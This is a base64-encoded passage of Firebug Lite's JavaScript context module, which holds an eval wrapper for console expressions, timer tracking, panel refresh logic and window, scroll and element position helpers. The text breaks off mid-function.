ioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCn19KTsNCg0KLyogU2VlIGxpY2Vuc2UudHh0IGZvciB0ZXJtcyBvZiB1c2FnZSAqLw0KDQpGQkwubnMoIC8qKkBzY29wZSBzX2NvbnRleHQqLyBmdW5jdGlvbigpIHsgd2l0aCAoRkJMKSB7DQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBHbG9iYWxzDQoNCnZhciByZWZyZXNoRGVsYXkgPSAzMDA7DQoNCi8vIE9wZXJhIGFuZCBzb21lIHZlcnNpb25zIG9mIHdlYmtpdCByZXR1cm5zIHRoZSB3cm9uZyB2YWx1ZSBvZiBkb2N1bWVudC5lbGVtZW50RnJvbVBvaW50KCkNCi8vIGZ1bmN0aW9uLCB3aXRob3V0IHRha2luZyBpbnRvIGFjY291bnQgdGhlIHNjcm9sbCBwb3NpdGlvbi4gU2FmYXJpIDQgKHdlYmtpdC81MzEuMjEuOCkgDQovLyBzdGlsbCBoYXZlIHRoaXMgaXNzdWUuIEdvb2dsZSBDaHJvbWUgNCAod2Via2l0LzUzMi41KSBkb2VzIG5vdC4gU28sIHdlJ3JlIGFzc3VtaW5nIHRoaXMgDQovLyBpc3N1ZSB3YXMgZml4ZWQgaW4gdGhlIDUzMiB2ZXJzaW9uDQp2YXIgc2hvdWxkRml4RWxlbWVudEZyb21Qb2ludCA9IGlzT3BlcmEgfHwgaXNTYWZhcmkgJiYgYnJvd3NlclZlcnNpb24gPCAiNTMyIjsNCg0KdmFyIGV2YWxFcnJvciA9ICJfX19maXJlYnVnX2V2YWx1YXRpb25fZXJyb3JfX18iOw0KdmFyIHBpeGVsc1BlckluY2g7DQoNCnZhciByZXNldFN0eWxlID0gIm1hcmdpbjowOyBwYWRkaW5nOjA7IGJvcmRlcjowOyBwb3NpdGlvbjphYnNvbHV0ZTsgb3ZlcmZsb3c6aGlkZGVuOyBkaXNwbGF5OmJsb2NrOyI7DQp2YXIgb2Zmc2NyZWVuU3R5bGUgPSByZXNldFN0eWxlICsgInRvcDotMTIzNHB4OyBsZWZ0Oi0xMjM0cHg7IjsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIENvbnRleHQNCg0KLyoqIEBjbGFzcyAqLw0KRkJMLkNvbnRleHQgPSBmdW5jdGlvbih3aW4pDQp7DQogICAgdGhpcy53aW5kb3cgPSB3aW4ud2luZG93Ow0KICAgIHRoaXMuZG9jdW1lbnQgPSB3aW4uZG9jdW1lbnQ7DQogICAgDQogICAgdGhpcy5icm93c2VyID0gRW52LmJyb3dzZXI7DQogICAgDQogICAgLy8gU29tZSB3aW5kb3dzIGluIElFLCBsaWtlIGlmcmFtZSwgZG9lc24ndCBoYXZlIHRoZSBldmFsKCkgbWV0aG9kDQogICAgaWYgKGlzSUUgJiYgIXRoaXMud2luZG93LmV2YWwpDQogICAgew0KICAgICAgICAvLyBCdXQgYWZ0ZXIgZXhlY3V0aW5nIHRoZSBmb2xsb3dpbmcgbGluZSB0aGUgbWV0aG9kIG1hZ2ljYWxseSBhcHBlYXJzIQ0KICAgICAgICB0aGlzLndpbmRvdy5leGVjU2NyaXB0KCJudWxsIik7DQogICAgICAgIC8vIEp1c3QgdG8gbWFrZSBzdXJlIHRoZSAibWFnaWMiIHJlYWxseSBoYXBwZW5lZA0KICAgICAgICBpZiAoIXRoaXMud2luZG93LmV2YWwpDQogICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoIkZpcmVidWcgRXJyb3I6IGV2YWwoKSBtZXRob2Qgbm90IGZvdW5kIGluIHRoaXMgd2luZG93Iik7DQogICAgfQ0KICAgIA0KICAgIC8vIENyZWF0ZSBhIG5ldyAiYmxhY2stYm94IiBldmFsKCkgbWV0aG9kIHRoYXQgcnVucyBpbiB0aGUgZ2xvYmFsIG5hbWVzcGFjZQ0KICAgIC8vIG9mIHRoZSBjb250ZXh0IHdpbmRvdywgd2l0aG91dCBleHBvc2luZyB0aGUgbG9jYWwgdmFyaWFibGVzIGRlY2xhcmVkDQogICAgLy8gYnkgdGhlIGZ1bmN0aW9uIHRoYXQgY2FsbHMgaXQNCiAgICB0aGlzLmV2YWwgPSB0aGlzLndpbmRvdy5ldmFsKCJuZXcgRnVuY3Rpb24oJyIgKw0KICAgICAgICAgICAgInRyeXsgcmV0dXJuIHdpbmRvdy5ldmFsLmFwcGx5KHdpbmRvdyxhcmd1bWVudHMpIH1jYXRjaChFKXsgRS4iK2V2YWxFcnJvcisiPXRydWU7IHJldHVybiBFIH0iICsNCiAgICAgICAgIicpIik7DQp9Ow0KDQpGQkwuQ29udGV4dC5wcm90b3R5cGUgPQ0KeyAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIC8vIHBhcnRpYWwtcG9ydCBvZiBGaXJlYnVnIHRhYkNvbnRleHQuanMNCiAgICANCiAgICBicm93c2VyOiBudWxsLA0KICAgIGxvYWRlZDogdHJ1ZSwNCiAgICANCiAgICBzZXRUaW1lb3V0OiBmdW5jdGlvbihmbiwgZGVsYXkpDQogICAgew0KICAgICAgICB2YXIgd2luID0gdGhpcy53aW5kb3c7DQogICAgICAgIA0KICAgICAgICBpZiAod2luLnNldFRpbWVvdXQgPT0gdGhpcy5zZXRUaW1lb3V0KQ0KICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCJzZXRUaW1lb3V0IHJlY3Vyc2lvbiIpOw0KICAgICAgICANCiAgICAgICAgdmFyIHRpbWVvdXQgPSB3aW4uc2V0VGltZW91dC5hcHBseSA/IC8vIElFIGRvZXNuJ3QgaGF2ZSBhcHBseSBtZXRob2Qgb24gc2V0VGltZW91dA0KICAgICAgICAgICAgICAgIHdpbi5zZXRUaW1lb3V0LmFwcGx5KHdpbiwgYXJndW1lbnRzKSA6DQogICAgICAgICAgICAgICAgd2luLnNldFRpbWVvdXQoZm4sIGRlbGF5KTsNCg0KICAgICAgICBpZiAoIXRoaXMudGltZW91dHMpDQogICAgICAgICAgICB0aGlzLnRpbWVvdXRzID0ge307DQoNCiAgICAgICAgdGhpcy50aW1lb3V0c1t0aW1lb3V0XSA9IDE7DQoNCiAgICAgICAgcmV0dXJuIHRpbWVvdXQ7DQogICAgfSwNCg0KICAgIGNsZWFyVGltZW91dDogZnVuY3Rpb24odGltZW91dCkNCiAgICB7DQogICAgICAgIGNsZWFyVGltZW91dCh0aW1lb3V0KTsNCg0KICAgICAgICBpZiAodGhpcy50aW1lb3V0cykNCiAgICAgICAgICAgIGRlbGV0ZSB0aGlzLnRpbWVvdXRzW3RpbWVvdXRdOw0KICAgIH0sDQoNCiAgICBzZXRJbnRlcnZhbDogZnVuY3Rpb24oZm4sIGRlbGF5KQ0KICAgIHsNCiAgICAgICAgdmFyIHdpbiA9IHRoaXMud2luZG93Ow0KICAgICAgICANCiAgICAgICAgdmFyIHRpbWVvdXQgPSB3aW4uc2V0SW50ZXJ2YWwuYXBwbHkgPyAvLyBJRSBkb2Vzbid0IGhhdmUgYXBwbHkgbWV0aG9kIG9uIHNldFRpbWVvdXQNCiAgICAgICAgICAgICAgICB3aW4uc2V0SW50ZXJ2YWwuYXBwbHkod2luLCBhcmd1bWVudHMpIDoNCiAgICAgICAgICAgICAgICB3aW4uc2V0SW50ZXJ2YWwoZm4sIGRlbGF5KTsNCg0KICAgICAgICBpZiAoIXRoaXMuaW50ZXJ2YWxzKQ0KICAgICAgICAgICAgdGhpcy5pbnRlcnZhbHMgPSB7fTsNCg0KICAgICAgICB0aGlzLmludGVydmFsc1t0aW1lb3V0XSA9IDE7DQoNCiAgICAgICAgcmV0dXJuIHRpbWVvdXQ7DQogICAgfSwNCg0KICAgIGNsZWFySW50ZXJ2YWw6IGZ1bmN0aW9uKHRpbWVvdXQpDQogICAgew0KICAgICAgICBjbGVhckludGVydmFsKHRpbWVvdXQpOw0KDQogICAgICAgIGlmICh0aGlzLmludGVydmFscykNCiAgICAgICAgICAgIGRlbGV0ZSB0aGlzLmludGVydmFsc1t0aW1lb3V0XTsNCiAgICB9LA0KDQogICAgaW52YWxpZGF0ZVBhbmVsczogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYgKCF0aGlzLmludmFsaWRQYW5lbHMpDQogICAgICAgICAgICB0aGlzLmludmFsaWRQYW5lbHMgPSB7fTsNCg0KICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGFyZ3VtZW50cy5sZW5ndGg7ICsraSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHBhbmVsTmFtZSA9IGFyZ3VtZW50c1tpXTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gYXZvaWQgZXJyb3IuIG5lZWQgdG8gY3JlYXRlIGEgYmV0dGVyIGdldFBhbmVsKCkgZnVuY3Rpb24gYXMgZXhwbGFpbmVkIGJlbG93DQogICAgICAgICAgICBpZiAoIUZpcmVidWcuY2hyb21lIHx8ICFGaXJlYnVnLmNocm9tZS5zZWxlY3RlZFBhbmVsKQ0KICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy92YXIgcGFuZWwgPSB0aGlzLmdldFBhbmVsKHBhbmVsTmFtZSwgdHJ1ZSk7DQogICAgICAgICAgICAvL1RPRE86IHh4eHBlZHJvIGNvbnRleHQgaG93IHRvIGdldCBhbGwgcGFuZWxzIHVzaW5nIGEgc2luZ2xlIGZ1bmN0aW9uPw0KICAgICAgICAgICAgLy8gdGhlIGN1cnJlbnQgd29ya2Fyb3VuZCB0byBtYWtlIHRoZSBpbnZhbGlkYXRpb24gd29ya3MgaXMgaW52YWxpZGF0aW5nDQogICAgICAgICAgICAvLyBvbmx5IHNpZGVQYW5lbHMuIFRoZXJlJ3MgYWxzbyBhIHByb2JsZW0gd2l0aCBwYW5lbCBuYW1lIChMb3dlckNhc2UgaW4gRmlyZWJ1ZyBMaXRlKQ0KICAgICAgICAgICAgdmFyIHBhbmVsID0gRmlyZWJ1Zy5jaHJvbWUuc2VsZWN0ZWRQYW5lbC5zaWRlUGFuZWxCYXIgPw0KICAgICAgICAgICAgICAgICAgICBGaXJlYnVnLmNocm9tZS5zZWxlY3RlZFBhbmVsLnNpZGVQYW5lbEJhci5nZXRQYW5lbChwYW5lbE5hbWUsIHRydWUpIDoNCiAgICAgICAgICAgICAgICAgICAgbnVsbDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKHBhbmVsICYmICFwYW5lbC5ub1JlZnJlc2gpDQogICAgICAgICAgICAgICAgdGhpcy5pbnZhbGlkUGFuZWxzW3BhbmVsTmFtZV0gPSAxOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKHRoaXMucmVmcmVzaFRpbWVvdXQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRoaXMuY2xlYXJUaW1lb3V0KHRoaXMucmVmcmVzaFRpbWVvdXQpOw0KICAgICAgICAgICAgZGVsZXRlIHRoaXMucmVmcmVzaFRpbWVvdXQ7DQogICAgICAgIH0NCg0KICAgICAgICB0aGlzLnJlZnJlc2hUaW1lb3V0ID0gdGhpcy5zZXRUaW1lb3V0KGJpbmRGaXhlZChmdW5jdGlvbigpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBpbnZhbGlkcyA9IFtdOw0KDQogICAgICAgICAgICBmb3IgKHZhciBwYW5lbE5hbWUgaW4gdGhpcy5pbnZhbGlkUGFuZWxzKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIC8vdmFyIHBhbmVsID0gdGhpcy5nZXRQYW5lbChwYW5lbE5hbWUsIHRydWUpOw0KICAgICAgICAgICAgICAgIC8vVE9ETzogeHh4cGVkcm8gY29udGV4dCBob3cgdG8gZ2V0IGFsbCBwYW5lbHMgdXNpbmcgYSBzaW5nbGUgZnVuY3Rpb24/DQogICAgICAgICAgICAgICAgLy8gdGhlIGN1cnJlbnQgd29ya2Fyb3VuZCB0byBtYWtlIHRoZSBpbnZhbGlkYXRpb24gd29ya3MgaXMgaW52YWxpZGF0aW5nDQogICAgICAgICAgICAgICAgLy8gb25seSBzaWRlUGFuZWxzLiBUaGVyZSdzIGFsc28gYSBwcm9ibGVtIHdpdGggcGFuZWwgbmFtZSAoTG93ZXJDYXNlIGluIEZpcmVidWcgTGl0ZSkNCiAgICAgICAgICAgICAgICB2YXIgcGFuZWwgPSBGaXJlYnVnLmNocm9tZS5zZWxlY3RlZFBhbmVsLnNpZGVQYW5lbEJhciA/DQogICAgICAgICAgICAgICAgICAgICAgICBGaXJlYnVnLmNocm9tZS5zZWxlY3RlZFBhbmVsLnNpZGVQYW5lbEJhci5nZXRQYW5lbChwYW5lbE5hbWUsIHRydWUpIDoNCiAgICAgICAgICAgICAgICAgICAgICAgIG51bGw7DQoNCiAgICAgICAgICAgICAgICBpZiAocGFuZWwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAocGFuZWwudmlzaWJsZSAmJiAhcGFuZWwuZWRpdGluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhbmVsLnJlZnJlc2goKTsNCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgcGFuZWwubmVlZHNSZWZyZXNoID0gdHJ1ZTsNCg0KICAgICAgICAgICAgICAgICAgICAvLyBJZiB0aGUgcGFuZWwgaXMgYmVpbmcgZWRpdGVkLCB3ZSdsbCBrZWVwIHRyeWluZyB0bw0KICAgICAgICAgICAgICAgICAgICAvLyByZWZyZXNoIGl0IHVudGlsIGVkaXRpbmcgaXMgZG9uZQ0KICAgICAgICAgICAgICAgICAgICBpZiAocGFuZWwuZWRpdGluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIGludmFsaWRzLnB1c2gocGFuZWxOYW1lKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGRlbGV0ZSB0aGlzLmludmFsaWRQYW5lbHM7DQogICAgICAgICAgICBkZWxldGUgdGhpcy5yZWZyZXNoVGltZW91dDsNCg0KICAgICAgICAgICAgLy8gS2VlcCBsb29waW5nIHVudGlsIGV2ZXJ5IHRhYiBpcyB2YWxpZA0KICAgICAgICAgICAgaWYgKGludmFsaWRzLmxlbmd0aCkNCiAgICAgICAgICAgICAgICB0aGlzLmludmFsaWRhdGVQYW5lbHMuYXBwbHkodGhpcywgaW52YWxpZHMpOw0KICAgICAgICB9LCB0aGlzKSwgcmVmcmVzaERlbGF5KTsNCiAgICB9LA0KICAgIA0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBFdmFsdXRhdGlvbiBNZXRob2QNCiAgICANCiAgICAvKioNCiAgICAgKiBFdmFsdWF0ZXMgYW4gZXhwcmVzc2lvbiBpbiB0aGUgY3VycmVudCBjb250ZXh0IHdpbmRvdy4NCiAgICAgKiANCiAgICAgKiBAcGFyYW0ge1N0cmluZ30gICBleHByICAgICAgICAgICBleHByZXNzaW9uIHRvIGJlIGV2YWx1YXRlZA0KICAgICAqIA0KICAgICAqIEBwYXJhbSB7U3RyaW5nfSAgIGNvbnRleHQgICAgICAgIHN0cmluZyBpbmRpY2F0aW5nIHRoZSBnbG9iYWwgbG9jYXRpb24NCiAgICAgKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvZiB0aGUgb2JqZWN0IHRoYXQgd2lsbCBiZSB1c2VkIGFzIHRoZQ0KICAgICAqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRleHQuIFRoZSBjb250ZXh0IGlzIHJlZmVycmVkIGluDQogICAgICogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhlIGV4cHJlc3Npb24gYXMgdGhlICJ0aGlzIiBrZXl3b3JkLg0KICAgICAqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElmIG5vIGNvbnRleHQgaXMgaW5mb3JtZWQsIHRoZSAid2luZG93Ig0KICAgICAqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRleHQgaXMgdXNlZC4NCiAgICAgKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgKiBAcGFyYW0ge1N0cmluZ30gICBhcGkgICAgICAgICAgICBzdHJpbmcgaW5kaWNhdGluZyB0aGUgZ2xvYmFsIGxvY2F0aW9uDQogICAgICogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2YgdGhlIG9iamVjdCB0aGF0IHdpbGwgYmUgdXNlZCBhcyB0aGUNCiAgICAgKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcGkgb2YgdGhlIGV2YWx1YXRpb24uDQogICAgICogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICogQHBhcmFtIHtGdW5jdGlvbn0gZXJyb3JIYW5kbGVyKG1lc3NhZ2UpIGVycm9yIGhhbmRsZXIgdG8gYmUgY2FsbGVkDQogICAgICogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRoZSBldmFsdWF0aW9uIGZhaWxzLg0KICAgICAqLw0KICAgIGV2YWx1YXRlOiBmdW5jdGlvbihleHByLCBjb250ZXh0LCBhcGksIGVycm9ySGFuZGxlcikNCiAgICB7DQogICAgICAgIC8vIHRoZSBkZWZhdWx0IGNvbnRleHQgaXMgdGhlICJ3aW5kb3ciIG9iamVjdC4gSXQgY2FuIGJlIGFueSBzdHJpbmcgdGhhdCByZXByZXNlbnRzDQogICAgICAgIC8vIGEgZ2xvYmFsIGFjY2Vzc2libGUgZWxlbWVudCBhczogIm15Lm5hbWVzcGFjZWQub2JqZWN0Ig0KICAgICAgICBjb250ZXh0ID0gY29udGV4dCB8fCAid2luZG93IjsNCiAgICAgICAgDQogICAgICAgIHZhciBpc09iamVjdExpdGVyYWwgPSB0cmltKGV4cHIpLmluZGV4T2YoInsiKSA9PSAwLA0KICAgICAgICAgICAgY21kLA0KICAgICAgICAgICAgcmVzdWx0Ow0KICAgICAgICANCiAgICAgICAgLy8gaWYgdGhlIGNvbnRleHQgaXMgdGhlICJ3aW5kb3ciIG9iamVjdCwgd2UgZG9uJ3QgbmVlZCBhIGNsb3N1cmUNCiAgICAgICAgaWYgKGNvbnRleHQgPT0gIndpbmRvdyIpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIElmIGl0IGlzIGFuIG9iamVjdCBsaXRlcmFsLCB0aGVuIHdyYXAgdGhlIGV4cHJlc3Npb24gd2l0aCBwYXJlbnRoZXNpcyBzbyB3ZSBjYW4gDQogICAgICAgICAgICAvLyBjYXB0dXJlIHRoZSByZXR1cm4gdmFsdWUNCiAgICAgICAgICAgIGlmIChpc09iamVjdExpdGVyYWwpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY21kID0gYXBpID8NCiAgICAgICAgICAgICAgICAgICAgIndpdGgoIithcGkrIil7ICgiK2V4cHIrIikgfSIgOg0KICAgICAgICAgICAgICAgICAgICAiKCIgKyBleHByICsgIikiOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNtZCA9IGFwaSA/DQogICAgICAgICAgICAgICAgICAgICJ3aXRoKCIrYXBpKyIpeyAiK2V4cHIrIiB9IiA6DQogICAgICAgICAgICAgICAgICAgIGV4cHI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBjbWQgPSBhcGkgPw0KICAgICAgICAgICAgICAgIC8vIHdpdGggQVBJIGFuZCBjb250ZXh0LCBubyByZXR1cm4gdmFsdWUNCiAgICAgICAgICAgICAgICAiKGZ1bmN0aW9uKGFyZ3VtZW50cyl7IHdpdGgoIiArIGFwaSArICIpeyAiICsNCiAgICAgICAgICAgICAgICAgICAgZXhwciArIA0KICAgICAgICAgICAgICAgICIgfSB9KS5jYWxsKCIgKyBjb250ZXh0ICsgIix1bmRlZmluZWQpIg0KICAgICAgICAgICAgICAgIDoNCiAgICAgICAgICAgICAgICAvLyB3aXRoIGNvbnRleHQgb25seSwgbm8gcmV0dXJuIHZhbHVlDQogICAgICAgICAgICAgICAgIihmdW5jdGlvbihhcmd1bWVudHMpeyAiICsgDQogICAgICAgICAgICAgICAgICAgIGV4cHIgKyANCiAgICAgICAgICAgICAgICAiIH0pLmNhbGwoIiArIGNvbnRleHQgKyAiLHVuZGVmaW5lZCkiOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICByZXN1bHQgPSB0aGlzLmV2YWwoY21kKTsNCiAgICAgICAgDQogICAgICAgIGlmIChyZXN1bHQgJiYgcmVzdWx0W2V2YWxFcnJvcl0pDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBtc2cgPSByZXN1bHQubmFtZSA/IChyZXN1bHQubmFtZSArICI6ICIpIDogIiI7DQogICAgICAgICAgICBtc2cgKz0gcmVzdWx0Lm1lc3NhZ2UgfHwgcmVzdWx0Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoZXJyb3JIYW5kbGVyKQ0KICAgICAgICAgICAgICAgIHJlc3VsdCA9IGVycm9ySGFuZGxlcihtc2cpOw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHJlc3VsdCA9IG1zZzsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIHJlc3VsdDsNCiAgICB9LA0KICAgIA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIC8vIFdpbmRvdyBNZXRob2RzDQogICAgDQogICAgZ2V0V2luZG93U2l6ZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIHdpZHRoPTAsIGhlaWdodD0wLCBlbDsNCiAgICAgICAgDQogICAgICAgIGlmICh0eXBlb2YgdGhpcy53aW5kb3cuaW5uZXJXaWR0aCA9PSAibnVtYmVyIikNCiAgICAgICAgew0KICAgICAgICAgICAgd2lkdGggPSB0aGlzLndpbmRvdy5pbm5lcldpZHRoOw0KICAgICAgICAgICAgaGVpZ2h0ID0gdGhpcy53aW5kb3cuaW5uZXJIZWlnaHQ7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAoKGVsPXRoaXMuZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50KSAmJiAoZWwuY2xpZW50SGVpZ2h0IHx8IGVsLmNsaWVudFdpZHRoKSkNCiAgICAgICAgew0KICAgICAgICAgICAgd2lkdGggPSBlbC5jbGllbnRXaWR0aDsNCiAgICAgICAgICAgIGhlaWdodCA9IGVsLmNsaWVudEhlaWdodDsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmICgoZWw9dGhpcy5kb2N1bWVudC5ib2R5KSAmJiAoZWwuY2xpZW50SGVpZ2h0IHx8IGVsLmNsaWVudFdpZHRoKSkNCiAgICAgICAgew0KICAgICAgICAgICAgd2lkdGggPSBlbC5jbGllbnRXaWR0aDsNCiAgICAgICAgICAgIGhlaWdodCA9IGVsLmNsaWVudEhlaWdodDsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIHt3aWR0aDogd2lkdGgsIGhlaWdodDogaGVpZ2h0fTsNCiAgICB9LA0KICAgIA0KICAgIGdldFdpbmRvd1Njcm9sbFNpemU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciB3aWR0aD0wLCBoZWlnaHQ9MCwgZWw7DQoNCiAgICAgICAgLy8gZmlyc3QgdHJ5IHRoZSBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQgc2Nyb2xsIHNpemUNCiAgICAgICAgaWYgKCFpc0lFUXVpa3NNb2RlICYmIChlbD10aGlzLmRvY3VtZW50LmRvY3VtZW50RWxlbWVudCkgJiYgDQogICAgICAgICAgIChlbC5zY3JvbGxIZWlnaHQgfHwgZWwuc2Nyb2xsV2lkdGgpKQ0KICAgICAgICB7DQogICAgICAgICAgICB3aWR0aCA9IGVsLnNjcm9sbFdpZHRoOw0KICAgICAgICAgICAgaGVpZ2h0ID0gZWwuc2Nyb2xsSGVpZ2h0Ow0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAvLyB0aGVuIHdlIG5lZWQgdG8gY2hlY2sgaWYgZG9jdW1lbnQuYm9keSBoYXMgYSBiaWdnZXIgc2Nyb2xsIHNpemUgdmFsdWUNCiAgICAgICAgLy8gYmVjYXVzZSBzb21ldGltZXMgZGVwZW5kaW5nIG9uIHRoZSBicm93c2VyIGFuZCB0aGUgcGFnZSwgdGhlIGRvY3VtZW50LmJvZHkNCiAgICAgICAgLy8gc2Nyb2xsIHNpemUgcmV0dXJucyBhIHNtYWxsZXIgKGFuZCB3cm9uZykgbWVhc3VyZQ0KICAgICAgICBpZiAoKGVsPXRoaXMuZG9jdW1lbnQuYm9keSkgJiYgKGVsLnNjcm9sbEhlaWdodCB8fCBlbC5zY3JvbGxXaWR0aCkgJiYNCiAgICAgICAgICAgIChlbC5zY3JvbGxXaWR0aCA+IHdpZHRoIHx8IGVsLnNjcm9sbEhlaWdodCA+IGhlaWdodCkpDQogICAgICAgIHsNCiAgICAgICAgICAgIHdpZHRoID0gZWwuc2Nyb2xsV2lkdGg7DQogICAgICAgICAgICBoZWlnaHQgPSBlbC5zY3JvbGxIZWlnaHQ7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHJldHVybiB7d2lkdGg6IHdpZHRoLCBoZWlnaHQ6IGhlaWdodH07DQogICAgfSwNCiAgICANCiAgICBnZXRXaW5kb3dTY3JvbGxQb3NpdGlvbjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIHRvcD0wLCBsZWZ0PTAsIGVsOw0KICAgICAgICANCiAgICAgICAgaWYodHlwZW9mIHRoaXMud2luZG93LnBhZ2VZT2Zmc2V0ID09ICJudW1iZXIiKQ0KICAgICAgICB7DQogICAgICAgICAgICB0b3AgPSB0aGlzLndpbmRvdy5wYWdlWU9mZnNldDsNCiAgICAgICAgICAgIGxlZnQgPSB0aGlzLndpbmRvdy5wYWdlWE9mZnNldDsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmKChlbD10aGlzLmRvY3VtZW50LmJvZHkpICYmIChlbC5zY3JvbGxUb3AgfHwgZWwuc2Nyb2xsTGVmdCkpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRvcCA9IGVsLnNjcm9sbFRvcDsNCiAgICAgICAgICAgIGxlZnQgPSBlbC5zY3JvbGxMZWZ0Ow0KICAgICAgICB9DQogICAgICAgIGVsc2UgaWYoKGVsPXRoaXMuZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50KSAmJiAoZWwuc2Nyb2xsVG9wIHx8IGVsLnNjcm9sbExlZnQpKQ0KICAgICAgICB7DQogICAgICAgICAgICB0b3AgPSBlbC5zY3JvbGxUb3A7DQogICAgICAgICAgICBsZWZ0ID0gZWwuc2Nyb2xsTGVmdDsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIHt0b3A6dG9wLCBsZWZ0OmxlZnR9Ow0KICAgIH0sDQogICAgDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gRWxlbWVudCBNZXRob2RzDQoNCiAgICBnZXRFbGVtZW50RnJvbVBvaW50OiBmdW5jdGlvbih4LCB5KQ0KICAgIHsNCiAgICAgICAgaWYgKHNob3VsZEZpeEVsZW1lbnRGcm9tUG9pbnQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBzY3JvbGwgPSB0aGlzLmdldFdpbmRvd1Njcm9sbFBvc2l0aW9uKCk7DQogICAgICAgICAgICByZXR1cm4gdGhpcy5kb2N1bWVudC5lbGVtZW50RnJvbVBvaW50KHggKyBzY3JvbGwubGVmdCwgeSArIHNjcm9sbC50b3ApOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHJldHVybiB0aGlzLmRvY3VtZW50LmVsZW1lbnRGcm9tUG9pbnQoeCwgeSk7DQogICAgfSwNCiAgICANCiAgICBnZXRFbGVtZW50UG9zaXRpb246IGZ1bmN0aW9uKGVsKQ0KICAgIHsNCiAgICAgICAgdmFyIGxlZnQgPSAwOw0KICAgICAgICB2YXIgdG9wID0gMDsNCiAgICAgICAgDQogICAgICAgIGRvDQogICAgICAgIHsNCiAgICAgICAgICAgIGxlZnQgKz0gZWwub2Zmc2V0TGVmdDsNCiAgICAgICAgICAgIHRvcCArPSBlbC5v